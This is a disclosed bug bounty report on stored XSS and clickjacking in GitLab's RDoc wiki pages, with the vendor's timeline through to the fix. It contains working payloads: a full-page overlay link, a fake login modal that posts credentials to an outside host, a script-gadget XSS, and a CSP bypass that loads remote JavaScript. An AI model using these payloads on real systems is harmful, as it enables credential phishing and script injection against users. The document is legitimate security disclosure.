---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/ui-redressing-clickjacking
  - env/web
  - stack/gitlab
  - vuln/xss
substate: "resolved"
weakness: "UI Redressing (Clickjacking)"
enriched: true
body: true
date: 2019-12-16
submitted: 2019-07-28T15:31:34.731Z
bounty_usd: 3500
votes: 283
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/662287"
title: "Cross-site Scripting (XSS) - Stored in RDoc wiki pages"
---
# Cross-site Scripting (XSS) - Stored in RDoc wiki pages

> **Severity:** High | **Bounty:** 3,500 USD | **Votes:** 283 | **Program:** GitLab | **Disclosed:** 2019-12-16

- Report: [https://hackerone.com/reports/662287](https://hackerone.com/reports/662287)
- CWE: UI Redressing (Clickjacking)
- Submitted: 2019-07-28T15:31:34.731Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format `{<img src>}[link]`

For example it is possible to specify a `class` attribute when creating an image link:

```rdoc
{
<a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'>
<img height=10000 width=10000></a>
}[a]
```

will generate the following:

```html
<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://aw.rs/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>
```

This will place a link taking over the entire page and intercept any clicks, `atwho-view select2-drop-mask pika-select` are just some real classes that make the links position absolute with a high z-index.

The `target` attribute could also be set to `_blank` and as there is no `rel="noopener"` [reverse tabnabbing](https://www.owasp.org/index.php/Reverse_Tabnabbing) is also possible.


Another attack that is more likely to work would be to create a form in a modal, which could be used to ask for a username and password:

```rdoc
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://aw.rs/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="password" class="form-control">
</div>
<div class="form-actions"><button name="button" type="submit" class="btn btn-success">Login</button></div>
</form>
</div>
</div>
</div>
</div>
}[/]
```

Which produces the following dialog when viewing the page:
{F541421}


### Steps to reproduce

1. Create a wiki on gitlab
1. Add a new RDoc page with the above snippet
1. Save and wait for someone to click it


### Impact
An attacker could trick a user into thinking they had clicked on a gitlab element when they are actually redirected to the attackers site, or be presented with a dialog that will post to an attackers site.

### Examples

Example linking to a fake sign in form:
https://gitlab.com/wbowling/wiki/wikis/home

Example creating a modal form:
https://gitlab.com/wbowling/wiki/wikis/home2

### What is the current *bug* behavior?
When using an image link in RDoc the anchor tag attributes are not sanitized correctly.

### What is the expected *correct* behavior?
They should be correctly sanitized.

### Relevant logs and/or screenshots


### Output of checks

This bug happens on GitLab.com

#### Results of GitLab environment info
```
System information
System:		Ubuntu 16.04
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.1.1
Revision:	f9abaa7d833
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Trick users into giving up their account details via a legitimate looking form on gitlab.com

## Timeline

- **Report Filed**
- **2019-07-28** @gitlab-securitybot: Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 14 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2019-07-29** @vakzz: After a bit more of a look it's possible to turn this into a stored XSS using the following:

```rdoc
{
<form class="gl-show-field-errors">
<input type="text" title="&lt;img src=x onerror=&quot;alert(document.domain)&quot;&gt;">
}[b]
```

This ends up in running the following from `gl_field_error.js`:

```javascript
  this.errorMessage = this.inputElement.attr('title') || __('This field is required.');
  this.fieldErrorElement = $(`<p class='${errorMessageClass} hidden'>${this.errorMessage}</p>`);
```

Example at:
https://gitlab.com/wbowling/wiki/wikis/home3
{F541759}

Might need to change the report weakness from `UI Redressing (Clickjacking)` to  `Cross-site Scripting (XSS) - Stored` and maybe update the severity (not sure where stored xss on the wiki falls)
- **2019-07-29** @vakzz: Due to the XSS I've changed the above project to be private, let me know if you require access and I can add anyone as a member or provide and export.

Cheers,
Will
- **Report Triaged**
- **2019-07-30** @vakzz: Hi @gitlab_cmaxim,

Thanks for the quick response and update, let me know if you require any other information otherwise I will wait for the next release or patch and retest.

Would you be able to change this report from clickjacking to stored cross site scripting? I am unable to edit that section of the report.

Cheers,
Will
- **2019-07-31** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The GitLab issue created from your report is currently scheduled for 2019-10-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Title Updated**
- **Report Severity Updated**
- **2019-07-31** @gitlab_cmaxim: Hi @vakzz, 

I have updated the title and severity. We will let you know when a fix was deployed.

Best Regards,
Costel
Security Team | GitLab Inc.
- **2019-07-31** @vakzz: Thanks for that @gitlab_cmaxim, once the new release is out or a fix is deployed I'll give it another test to confirm.

Cheers,
Will
- **2019-09-09** @gitlab_cmaxim: Hi @vakzz,

Just wanted to give you an update regarding this issue: In the previous security release there were several fixes for the XSS related issues. 
You can find more details here: 
https://gitlab.com/gitlab-org/gitlab-ce/issues/64033 -- to be public at the end of september.
https://gitlab.com/gitlab-org/gitlab-ce/issues/60143 
 
With these patches the XSS part of this report does not reproduce and we consider it as a duplicate. The engineering team is working on fixing the initial issue reported (rel="noopener").

We will keep you posted once a fix is released.

Regards,
Costel
- **2019-09-09** @vakzz: Hi @gitlab_cmaxim,

Thanks for the update. Has the security release been applied to https://gitlab.com or is it an upcoming release? I'm still seeing that the POC for the XSS is working, eg https://gitlab.com/wbowling/wiki/wikis/home3

Cheers,
Will
- **2019-09-09** @vakzz: This may be fixed in https://gitlab.com/gitlab-org/gitlab-ce/issues/64033 if that is for an upcoming release (not sure until it's made public), but here are a few more details just in case.

The vector only allows for safe elements and attributes to be added, but combining that with the script gadget in [gl_field_error.js](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/app%2Fassets%2Fjavascripts%2Fgl_field_error.js#L66) allows it to be turned into an XSS (Similar to this talk https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)

The following HTML is generated by the POC posted above which is free from any XSS, but after [main.js#L329](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/app/assets/javascripts/main.js#L329) is run it will become and XSS.

```html
<div class="md md-file">
&#x000A;<p><a href="b" rel="nofollow"> <form class="gl-show-field-errors"> <input type="text" title='&lt;img src=x onerror="alert(document.domain)"&gt;'> </form></a></p>
</div>
```

https://gitlab.com/wbowling/wiki/wikis/home3

Cheers,
Will
- **2019-10-03** @vakzz: Hi @gitlab_cmaxim,

Looking at https://gitlab.com/gitlab-org/gitlab-ce/issues/64033 now that is is public, I think this is a different issue? The supplied [POC at home3](https://gitlab.com/wbowling/wiki/wikis/home3) is still working on the latest version, but being blocked on gitlab.com due to the new: CSP rules `Content Security Policy: The page's settings blocked the loading of a resource at inline ("script-src"). home3:25:34643`

Cheers,
Will
- **2019-10-13** @vakzz: I've added a version at https://gitlab.com/wbowling/wiki/wikis/home3b that includes a CSP bypass, although it does require the user to click anywhere on the page. The final RDoc payload is:

```RDoc
{
<form class="gl-show-field-errors">
<input type="text" title="&#x3C;/p&#x3E;&#x3C;a data-remote=&#x22;true&#x22; data-method=&#x22;get&#x22; data-type=&#x22;script&#x22; href=&#x22;https://gitlab.com/wbowling/wiki/raw/master/test.js&#x22; class=&#x27;atwho-view select2-drop-mask pika-select&#x27;&#x3E;&#x3C;img height=10000 width=10000&#x3E;&#x3C;/a&#x3E;">
}[#]
```

This creates the following html which is inserted via jQuery, creating a full screen link overlaying everything:
```html
</p>
<a 
  data-remote="true"
  data-method="get"
  data-type="script"
  href="https://gitlab.com/wbowling/wiki/raw/master/test.js"
  class='atwho-view select2-drop-mask pika-select'
>
  <img height=10000 width=10000>
</a>
```

This will cause `jquery-ujs` to fire an ajax request when clicked to our url (hosted on gitlab so it's allowed under the `self` policy of `script-src`), and end up running through `jQuery.globalEval(text, { nonce: getCspNonceValue() });` in [main.js#L53](https://gitlab.com/gitlab-org/gitlab-foss/blob/master/app%2Fassets%2Fjavascripts%2Fmain.js#L53) executing the payload.

{F606367}
- **2019-10-15** @gitlab_cmaxim: Hi @vakzz,

Thank you for your updates and effort invested in this report, I have forwarded the information to our dev team. A fix is currently developed, I will let you know when it can be tested on gitlab.com.

Regards,
Costel 
GitLab Security Team
- **2019-11-02** @vakzz: Hi @gitlab_cmaxim,

I see the fix for this went out in the latest release, can confirm that I can no longer reproduce the issue.

Cheers,
Will
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
